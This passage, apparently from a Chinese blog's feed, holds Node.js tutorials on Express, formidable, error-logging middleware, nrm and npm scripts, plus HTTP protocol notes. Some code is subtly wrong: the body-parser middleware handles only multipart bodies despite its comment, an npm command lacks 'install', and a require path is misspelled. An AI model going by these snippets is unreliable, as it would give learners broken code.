class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i --save formidable</span><br></pre></td></tr></table></figure><h2 id="引入模块"><a href="#引入模块" class="headerlink" title="引入模块"></a>引入模块</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> formidable = <span class="built_in">require</span>(<span class="string">'formidable'</span>)</span><br></pre></td></tr></table></figure><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.post(<span class="string">'/'</span>, (req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> form = formidable(&#123; <span class="attr">multiples</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">  form.uploadDir = <span class="string">'./upload'</span> <span class="comment">//默认存储路径</span></span><br><span class="line">  form.keepExtensions = <span class="literal">true</span> <span class="comment">// 配置保持文件原始的扩展名</span></span><br><span class="line">  form.parse(req, (err, fields, files) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      next(err)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// res.json(&#123; fields, files &#125;)</span></span><br><span class="line">    <span class="built_in">console</span>.log(fields) <span class="comment">//请求体字段显示</span></span><br><span class="line">    <span class="built_in">console</span>.log(files) <span class="comment">//文件信息，files.image.path为图像文件路径，这时可以用path.basename将图像名字保存至数据库</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>该中间件的其它相关操作可以参考这篇文章 <a href="https://www.cnblogs.com/abab301/p/9489000.html" target="_blank" rel="noopener">https://www.cnblogs.com/abab301/p/9489000.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ajax </tag>
            
            <tag> Node.js </tag>
            
            <tag> formidable </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>根据id显示页面详情</title>
      <link href="/2020/07/28/%E6%A0%B9%E6%8D%AEid%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E8%AF%A6%E6%83%85/"/>
      <url>/2020/07/28/%E6%A0%B9%E6%8D%AEid%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E8%AF%A6%E6%83%85/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>指定路径可以通过id去获取相关的资源页面</p><p>如： 每个广告都有其展示页面，这时候可以指定/:adverId去动态的创建路径</p></blockquote><ul><li>/a/:advertId 是一个模糊匹配路径</li><li>可以匹配 /a/* 的路径形式，例如：/a/1,/a/a, /a/abc 等路径</li><li>但是/one 或者 /one/a/b 是无法访问到的</li><li>处理函数中可以通过 req.params 来获取到这个路径名</li><li>在前端完成相关操作后，服务端就可以根据请求接收到的id号进行数据查询和页面渲染了</li></ul><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/a/:adverId'</span>, (req, res, next) =&gt; &#123;</span><br><span class="line"><span class="built_in">console</span>.log(req.params)<span class="comment">//获得id，进行相关操作</span></span><br><span class="line">    <span class="comment">//接下来就可以进行相关的数据库查询操作和渲染与该id匹配的广告也页面详情了</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'runing.....'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="输出打印"><a href="#输出打印" class="headerlink" title="输出打印"></a>输出打印</h1><p><img src= "/img/loading.gif" data-src="/2020/07/28/%E6%A0%B9%E6%8D%AEid%E6%98%BE%E7%A4%BA%E9%A1%B5%E9%9D%A2%E8%AF%A6%E6%83%85/image-20200727161444272.png" alt="image-20200727161444272"></p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>错误处理中间件</title>
      <link href="/2020/07/28/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
      <url>/2020/07/28/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>用来将错误日志记录在数据库中以及响应前端错误信息和状态码的中间件</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><ol><li><p>先连接mongo数据库以及创建集合</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>)</span><br><span class="line"></span><br><span class="line">mongoose.connect(<span class="string">'mongodb://localhost:27017/edu'</span>, &#123; <span class="attr">useNewUrlParser</span>: <span class="literal">true</span>, <span class="attr">useUnifiedTopology</span>: <span class="literal">true</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> Schema = mongoose.Schema</span><br><span class="line"><span class="keyword">let</span> errorSchema = <span class="keyword">new</span> Schema(&#123;</span><br><span class="line">    errName: &#123;</span><br><span class="line">        type: <span class="built_in">String</span>,</span><br><span class="line">        <span class="built_in">require</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    errMessage: &#123;</span><br><span class="line">        type: <span class="built_in">String</span>,</span><br><span class="line">        <span class="built_in">require</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    errStack: &#123;</span><br><span class="line">        type: <span class="built_in">String</span>,</span><br><span class="line">        <span class="built_in">require</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    errTime: &#123;</span><br><span class="line">        type: <span class="built_in">Date</span>,</span><br><span class="line">        <span class="built_in">require</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ErrData = mongoose.model(<span class="string">'ErrData'</span>, errorSchema)</span><br></pre></td></tr></table></figure></li><li><p>处理错误日志以及导出该模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">errlog,req,res,next</span>)=&gt;</span> &#123;</span><br><span class="line"><span class="keyword">new</span> ErrData(&#123;</span><br><span class="line">errName: errlog.name,</span><br><span class="line">errMessage: errlog.message,</span><br><span class="line">errStack: errlog.stack,</span><br><span class="line">errTime: <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">&#125;).save(<span class="function">(<span class="params">err,result</span>) =&gt;</span>&#123;</span><br><span class="line">res.status(<span class="number">500</span>).json(&#123;</span><br><span class="line">err_code: <span class="number">500</span>,</span><br><span class="line">err_message: errlog.message</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>app.js导入该模块并调用，注意各个中间件的先后顺序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> errorLog = <span class="built_in">require</span>(<span class="string">'./middlewave/errpr-log'</span>) </span><br><span class="line">app.use(errorLog)</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nrm</title>
      <link href="/2020/07/28/nrm/"/>
      <url>/2020/07/28/nrm/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>nrm(npm registry manager )是npm的镜像源管理工具，可以使用这个工具快速地在不同的npm源间切换</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>全局安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g nrm</span><br></pre></td></tr></table></figure><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><ul><li><p><code>nrm ls</code></p><p>查看可以选择的npm源</p><p><img src= "/img/loading.gif" data-src="/2020/07/28/nrm/image-20200726172330948.png" alt="image-20200726172330948"></p><p>带*的是当前使用的源</p></li><li><p><code>nrm use 源</code></p><p>这个是用来切换源的</p><p>例如：<code>nrm use taobao</code>就是使用淘宝镜像源</p></li><li><p><code>nrm del 源</code></p><p>删除某个源</p></li><li><p><code>nrm test 源</code> </p><p>测试某个源的速度</p></li><li><p><code>nrm add 源名 源路径</code></p><p>添加其它源</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>body-parser原理及实现方式</title>
      <link href="/2020/07/28/body-parser%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/"/>
      <url>/2020/07/28/body-parser%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="原理简介"><a href="#原理简介" class="headerlink" title="原理简介"></a>原理简介</h1><blockquote><p>由于表单 POST 请求可能会携带大量的数据，所以在进行请求提交的时候会分为多次提交，具体分为多少次进行提交不一定，取决于数据量的大小<br>在 Node 中，对于处理这种不确定的数据，使用事件的形式处理<br>这里可以监听 req 对象的 data 事件，然后通过对应的回调处理函数中的参数 chunk 拿到每一次接收到的数据data，当数据接收完毕之后，会自动触发 req 对象的 end 事件，然后就可以在 end 事件中使用接收到的表单 POST 请求体</p></blockquote><h1 id="代码原理"><a href="#代码原理" class="headerlink" title="代码原理"></a>代码原理</h1><p>记得先引入<code>querystring</code>模块</p><p><code>querystring</code>用作分割请求体内容并转化为对象格式</p><p>因为有时候会用到文件上传，所以这里要判断数据请求头的<code>content-type</code>，如果是<code>multipart/form-data</code>，则让<code>formidable</code>中间件（涉及到文件提交的，可以参考这篇<a href="https://ypigy.gitee.io/2020/07/29/form%E8%A1%A8%E5%8D%95%E6%96%87%E4%BB%B6%E6%8F%90%E4%BA%A4/" target="_blank" rel="noopener">博客</a>）去处理，否则自己处理</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">``</span></span><br><span class="line">    <span class="keyword">if</span> (req.method.toLowerCase() === <span class="string">'get'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果是有文件的表单POST，则不处理</span></span><br><span class="line">    <span class="keyword">if</span> (req.headers[<span class="string">'content-type'</span>].startsWith(<span class="string">'multipart/form-data'</span>)) &#123;</span><br><span class="line">        req.on(<span class="string">'data'</span>, chunk =&gt; &#123;</span><br><span class="line">            data += chunk</span><br><span class="line">        &#125;)</span><br><span class="line">        req.on(<span class="string">'end'</span>, () =&gt; &#123;</span><br><span class="line">            req.body = queryString.parse(data)</span><br><span class="line">            next()</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm script配置</title>
      <link href="/2020/07/28/npm-script%E9%85%8D%E7%BD%AE/"/>
      <url>/2020/07/28/npm-script%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>通过配置package.json中的代码，即可在命令行通过npm执行模块命令，如启动服务或转码处理</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><ol><li><p>通过在项目中安装nodemon后，即可在其他无nodemon的开发者电脑中安装并通过npm执行该项目了</p><p>安装格式</p></li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm --save-dev nodemon</span><br></pre></td></tr></table></figure><ol start="2"><li><p>package.json中配置启动项</p><p>格式：<code>&quot;命令名&quot;: &quot;nodemon 执行文件相对路径&quot;</code>  启动某个服务</p><p>下面为示例</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"edu"</span>,</span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="string">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="string">"main"</span>: <span class="string">"app.js"</span>,</span><br><span class="line">   <span class="comment">//代码配置格式↓</span></span><br><span class="line">  <span class="string">"scripts"</span>: &#123;</span><br><span class="line">    <span class="string">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span>,</span><br><span class="line">    <span class="string">"build"</span>: <span class="string">"babel src -d dist"</span>, <span class="comment">//开发代码转为生产代码</span></span><br><span class="line">    <span class="string">"prestart"</span>: <span class="string">"npm run build"</span>,</span><br><span class="line">    <span class="string">"start"</span>: <span class="string">"nodemon main.js"</span></span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><ol start="3"><li>然后在命令行中就可以直接<code>npm run prestart</code>或者<code>npm run build</code>去执行命令了，这里有一个特殊点，<code>start</code>的话可以直接<code>npm start</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs之请求日志和错误日志</title>
      <link href="/2020/07/28/nodejs%E4%B9%8B%E8%AF%B7%E6%B1%82%E6%97%A5%E5%BF%97%E5%92%8C%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97/"/>
      <url>/2020/07/28/nodejs%E4%B9%8B%E8%AF%B7%E6%B1%82%E6%97%A5%E5%BF%97%E5%92%8C%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97/</url>
      
        <content type="html"><![CDATA[<h2 id="请求日志"><a href="#请求日志" class="headerlink" title="请求日志"></a>请求日志</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> log = <span class="string">`请求方法: <span class="subst">$&#123;req.method&#125;</span>, 请求路径: <span class="subst">$&#123;req.url&#125;</span>, 请求时间: <span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>()&#125;</span>\n`</span>;</span><br><span class="line">    fs.appendFile(<span class="string">'option.txt'</span>, log, <span class="string">'utf8'</span>, err =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'记录日志失败'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>打印结果为一个txt文件</p><p><img src= "/img/loading.gif" data-src="/2020/07/28/nodejs%E4%B9%8B%E8%AF%B7%E6%B1%82%E6%97%A5%E5%BF%97%E5%92%8C%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97/image-20200725215740007.png" alt="image-20200725215740007"></p><h2 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">err, req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> errLog = <span class="string">`</span></span><br><span class="line"><span class="string">错误名: <span class="subst">$&#123;err.name&#125;</span></span></span><br><span class="line"><span class="string">错误信息: <span class="subst">$&#123;err.message&#125;</span></span></span><br><span class="line"><span class="string">错误堆栈: <span class="subst">$&#123;err.stack&#125;</span></span></span><br><span class="line"><span class="string">错误时间: <span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>()&#125;</span></span></span><br><span class="line"><span class="string">\n\n\n`</span></span><br><span class="line">fs.appendFile(<span class="string">'errlog.txt'</span>, errLog,(err)=&gt;&#123;</span><br><span class="line">res.writeHead(<span class="number">500</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'text/plain;charset=utf-8'</span>&#125;)<span class="comment">//响应头返回状态码500</span></span><br><span class="line">res.end(<span class="string">'500 服务器正忙，请稍后重试'</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>打印日志在txt文件上</p><p><img src= "/img/loading.gif" data-src="/2020/07/28/nodejs%E4%B9%8B%E8%AF%B7%E6%B1%82%E6%97%A5%E5%BF%97%E5%92%8C%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97/image-20200725220109233.png" alt="image-20200725220109233"></p>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http协议</title>
      <link href="/2020/07/28/http%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/07/28/http%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>本文基于阅读<code>图解HTTP</code>后做的一部分笔记，讲解了一部分的http协议知识，期间还查阅了<code>菜鸟教程</code>的资料</p></blockquote><p> Web 使用一种名为 HTTP（HyperText Transfer Protocol，超文本传输协议）的协议作为规范，完成从客户端到服务器端等一系列运作流程。而协议是指规则的约定。可以说，Web 是建立在 HTTP 协议上通信的。 </p><p> HTTP是一个基于TCP/IP通信协议来传递数据（HTML 文件, 图片文件, 查询结果等） </p><h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><ul><li><p>HTTP 协议用于客户端和服务器端之间的通信</p></li><li><p>通过请求和响应的交换达成通信 </p></li><li><p>HTTP 是不保存状态的协议 </p><blockquote><p> 不保存状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。 </p></blockquote></li><li><p>请求 URI 定位资源 </p></li><li><p>可以使用 Cookie 的状态管理 </p></li><li><p>管线化 </p><blockquote><p> 管线化技术出现后，不用等待响应亦可直接发送下一个请求。 就能够做到同时并行发送多个请求，而不需要一个接一个地等待响应了</p></blockquote></li><li><p>持久连接</p><blockquote><p>只要任意一端没有明确提出断开连接，则保持 TCP 连接状态 </p></blockquote></li><li><p>Cookie管理状态</p><blockquote><p>Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的 首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器 发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。 </p><p>服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一 个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前 的状态信息。 </p></blockquote></li></ul><h1 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h1><p>下表源于<a href="https://www.runoob.com/http/http-methods.html" target="_blank" rel="noopener">菜鸟教程</a>，最常用的两种方法是get和post</p><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><strong>GET</strong></td><td align="left"><strong>请求指定的页面信息，并返回实体主体。</strong></td></tr><tr><td align="left">HEAD</td><td align="left">类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td></tr><tr><td align="left"><strong>POST</strong></td><td align="left"><strong>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。</strong></td></tr><tr><td align="left">PUT</td><td align="left">从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td align="left">DELETE</td><td align="left">请求服务器删除指定的页面。</td></tr><tr><td align="left">CONNECT</td><td align="left">HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td align="left">OPTIONS</td><td align="left">允许客户端查看服务器的性能。</td></tr><tr><td align="left">TRACE</td><td align="left">回显服务器收到的请求，主要用于测试或诊断。</td></tr><tr><td align="left">PATCH</td><td align="left">是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td></tr></tbody></table><h1 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h1><p> HTTP 状态码负责表示客户端 HTTP 请求的返回结果、标记服务器端 的处理是否正常、通知出现的错误等工作。</p><p>常用状态码↓ </p><h2 id="成功2XX"><a href="#成功2XX" class="headerlink" title="成功2XX"></a>成功2XX</h2><table><thead><tr><th align="left">状态码</th><th align="left">状态码短语</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">200</td><td align="left">OK</td><td align="left">请求成功。一般用于GET与POST请求</td></tr><tr><td align="left">201</td><td align="left">Created</td><td align="left">已创建。成功请求并创建了新的资源</td></tr><tr><td align="left">202</td><td align="left">Accepted</td><td align="left">已接受。已经接受请求，但未处理完成</td></tr><tr><td align="left">203</td><td align="left">Non-Authoritative Information</td><td align="left">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td align="left">204</td><td align="left">No Content</td><td align="left">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td align="left">205</td><td align="left">Reset Content</td><td align="left">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td align="left">206</td><td align="left">Partial Content</td><td align="left">部分内容。服务器成功处理了部分GET请求</td></tr></tbody></table><h2 id="重定向3XX"><a href="#重定向3XX" class="headerlink" title="重定向3XX"></a>重定向3XX</h2><table><thead><tr><th align="left">状态码</th><th align="left">状态码英文名称</th><th align="left">中文描述</th></tr></thead><tbody><tr><td align="left">301</td><td align="left">Moved Permanently</td><td align="left">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td align="left">302</td><td align="left">Found</td><td align="left">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td align="left">303</td><td align="left">See Other</td><td align="left">303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确 表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区 别</td></tr><tr><td align="left">304</td><td align="left">Not Modified</td><td align="left">该状态码表示客户端发送附带条件的请求 时，服务器端允许请求访问资源，但未满足条件的情况</td></tr><tr><td align="left">307</td><td align="left">Temporary Redirect</td><td align="left">临时重定向。</td></tr></tbody></table><h2 id="客户端错误4XX"><a href="#客户端错误4XX" class="headerlink" title="客户端错误4XX"></a>客户端错误4XX</h2><table><thead><tr><th align="left">状态码</th><th align="left">状态码英文名称</th><th align="left">中文描述</th></tr></thead><tbody><tr><td align="left">400</td><td align="left">Bad Request</td><td align="left">该状态码表示请求报文中存在语法错误，服务器无法理解</td></tr><tr><td align="left">401</td><td align="left">Unauthorized</td><td align="left">该状态码表示发送的请求需要有通过 HTTP 认证（BASIC 认证、 DIGEST 认证）的认证信息。另外若之前已进行过 1 次请求，则表示 用 户认证失败。</td></tr><tr><td align="left">403</td><td align="left">Forbidden</td><td align="left">服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td align="left">404</td><td align="left">Not Found</td><td align="left">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr></tbody></table><h2 id="服务器错误5XX"><a href="#服务器错误5XX" class="headerlink" title="服务器错误5XX"></a>服务器错误5XX</h2><table><thead><tr><th>状态码</th><th>状态码英文名称</th><th>中文描述</th></tr></thead><tbody><tr><td>500</td><td>Internal Server Error</td><td>该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web 应用存在的 bug 或某些临时的故障。</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr></tbody></table><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p> 状态码和状况的不一致：不少返回的状态码响应都是错误的，但是用户可能察觉不到这点。 比如 Web 应用程序内部发生错误，状态码依然返回 200 OK，这种情况也经常遇到。  </p><h1 id="代理、网关、隧-道"><a href="#代理、网关、隧-道" class="headerlink" title="代理、网关、隧 道"></a>代理、网关、隧 道</h1><blockquote><p> HTTP 通信时，除客户端和服务器以外，还有一些用于通信数据转发 的应用程序，例如代理、网关和隧道。它们可以配合服务器工作。 这些应用程序和服务器可以将请求转发给通信线路上的下一站服务器，并且能接收从那台服务器发送的响应再转发给客户端。 </p></blockquote><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端“中间人”的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。</p><h2 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h2><p>网关是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关。 </p><h2 id="隧道"><a href="#隧道" class="headerlink" title="隧道"></a>隧道</h2><p>隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方 通信连接的应用程序。 </p><h1 id="Http缺点"><a href="#Http缺点" class="headerlink" title="Http缺点"></a>Http缺点</h1><h2 id="通信使用明文（不加密），内容可能会被窃听"><a href="#通信使用明文（不加密），内容可能会被窃听" class="headerlink" title="通信使用明文（不加密），内容可能会被窃听"></a>通信使用明文（不加密），内容可能会被窃听</h2><ul><li>TCP/IP 是可能被窃听的网络</li><li>加密处理防止被窃听<ul><li>通信加密（SSL、TLS）→与 SSL组合使用的 HTTP 被称为 HTTPS（HTTP Secure，超文本传输安全协议）</li><li>内容的加密→由于HTTP 协议中没有加密机制，那么就对 HTTP 协议传输的内容本身加密。即把 HTTP 报文里所含的内容进行加密处理。</li></ul></li></ul><h2 id="不验证通信方的身份就可能遭遇伪装"><a 